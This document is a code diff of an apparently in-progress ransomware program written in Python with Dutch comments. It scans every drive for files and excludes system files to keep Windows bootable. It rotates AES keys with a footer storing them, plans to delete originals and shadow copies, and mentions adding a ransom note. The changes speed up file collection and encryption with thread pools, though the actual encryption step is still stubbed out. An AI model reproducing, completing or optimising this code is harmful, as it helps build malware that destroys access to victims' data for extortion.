@@ -1,11 +1,13 @@
 from symEncryption import *
 import ctypes
-import concurrent.futures
+import concurrent.futures # voor threading pools
 import subprocess
 import psutil
 import threading
 import os
+import time
 from keygen import *
+from collections import deque # voor snellere list operaties
 
 
 class Encryptor:
@@ -19,9 +21,12 @@ class Encryptor:
         """
         a function which scans drives A-Z
         """
+        start_time = time.time()
         bitmask = ctypes.windll.kernel32.GetLogicalDrives() #returns a bitmask where each bit represents a drive letter. 
         self.drives = [f"{chr(65 + i)}:\\" for i in range(26) if bitmask & (1 << i)] #converts the bit index into a letter
-        print(f"[LOG] drives found: {self.drives}")
+        end_time = time.time()
+
+        print(f"[LOG] drives found: {self.drives}, time elapsed: {end_time - start_time}s")
 
 
     def get_files_from_drive(self, drive):
@@ -29,7 +34,7 @@ class Encryptor:
         
         #These are files and directories that we wont encrypt since they will stop the os from functioning
         EXCLUDED_EXTENSIONS = {".exe", ".dll", ".sys", ".lnk", ".log"}
-        EXCLUDED_FILES = {"boot.ini", "bootmgr", "ntldr", "BCD"}
+        EXCLUDED_FILES = {"boot.ini", "bootmgr", "ntldr", "BCD"} #add ransomnote 
         EXCLUDED_DIRS = {
             "C:\\Windows",
             "C:\\Program Files",
@@ -57,7 +62,7 @@ class Encryptor:
                                 filepaths.append(entry.path)
             except (PermissionError, FileNotFoundError):
                 pass  # skip directories that cannot be accessed
-
+       
         scan_directory(drive) #call function scan directory
         return filepaths
 
@@ -66,50 +71,52 @@ class Encryptor:
         run multiple threads at once to scan a drive for files, this will execute file collection across multiple drives at once.
         Instead of scanning one drive at a time, multiple drives are scanned simultaneously, making it much faster.
         """
+        start_time = time.time()
         with concurrent.futures.ThreadPoolExecutor() as executor: #
             results = executor.map(self.get_files_from_drive, self.drives)
         
         # Flatten results
         self.filepaths = [file for result in results for file in result] #add all values to the self.filepaths list
-        print(f"[LOG] Files found: {len(self.filepaths)}")
-        print(self.filepaths[1])
+        end_time = time.time()
+        print(f"[LOG] Files found: {len(self.filepaths)}, time elapsed: {end_time - start_time}s")
 
-
-    def encrypt(self, files_list):
+    def encrypt(self, files_list, counter=10000):
         """
-        the encrypt function the threading calls
+        The encrypt function called by threading.
         """
-        counter = 10
         encrypted_count = 0
-        
-        while files_list:
+        files_list = deque(files_list)  # O(1) verwijderingen met deque
+
+        while files_list:  # Loop zolang er bestanden zijn
+            encrypted_count += 1
+            filepath = files_list.popleft()  # Verwijder bestand uit deque (O(1))
+
+            # Genereer een nieuwe sleutel elke 10.000 bestanden
+            if counter >= 10000:
+                print("[LOG] Generating new AES key...")
+                symenc = Symmetric_encryption()
+                symenc.generate_key()
+                footer = self.generate_footer(symenc.iv, symenc.AES_key)
+                counter = 1  # Reset teller
+
+            counter += 1
             
-            for filepath in files_list:
-                encrypted_count += 1
-                
-                # Every 10 files encrypte generate a new key and footer 
-                if counter == 10:
-                    print("[LOG] Generating AES key...")
-                    symenc = Symmetric_encryption()
-                    symenc.generate_key()
-                    footer = self.generate_footer(symenc.iv, symenc.AES_key)
-                    counter = 1
-
-                try:
-                    print(encrypted_count)
-                    #with open(filepath, 'rb') as f:  
-                     #   content = f.read()
+            # TODO: encryptielogica
+            try:
+            
+                with open(filepath, 'rb') as f:  
+                    content = f.read()
                     
-                    #encrypt content
+                #encrypt content
                     
-                    #open new file with .ENC enxtension
-                        #add encrypted content
-                        #add footer
+                #open new file with .ENC enxtension
+                    #add encrypted content
+                    #add footer
 
-                    #delete original file
+                #delete original file
+            except:
+                pass
 
-                except:
-                    pass
         print(f"[LOG] {encrypted_count} files encrypted")
 
     def generate_footer(self, iv, AES_key):
@@ -161,8 +168,8 @@ class Encryptor:
         """
         a function which starts a thread for encrytion, it will spaw multiple threads
         """
-        #threads = self.determine_thread_count()
-        threads = 40
+        threads = self.determine_thread_count()
+        #threads = 40
 
         #split list by amount of threads
 
@@ -179,17 +186,28 @@ class Encryptor:
             start = end  # Update start index for next chunk
 
         #call threads to encrypt and pass a section of the list
-        threads = []
+        #threads = []
 
-    # Maak een thread voor de split file list
-        for i, files in enumerate(result):
-            thread = threading.Thread(target=self.encrypt, args=(files,)) # call the encrypt method and start a thread
-            threads.append(thread)
-            thread.start()
+        # Maak een thread voor de split file list
+        start_time = time.time()
+
+        # Verwerk de encryptie met een thread pool
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+            for files in result:
+                executor.submit(self.encrypt, files)
+        
+        #for i, files in enumerate(result):
+            #thread = threading.Thread(target=self.encrypt, args=(files,)) # call the encrypt method and start a thread
+            #threads.append(thread)
+            #thread.start()
 
         # Wacht tot alle threads klaar zijn
-        for thread in threads:
-            thread.join()
+        #for thread in threads:
+            #thread.join()
+
+        end_time = time.time()
+
+        print(f"all files encrypted, time elapsed: {end_time-start_time}s")
 
 
     def delete_shadow_copies(self):
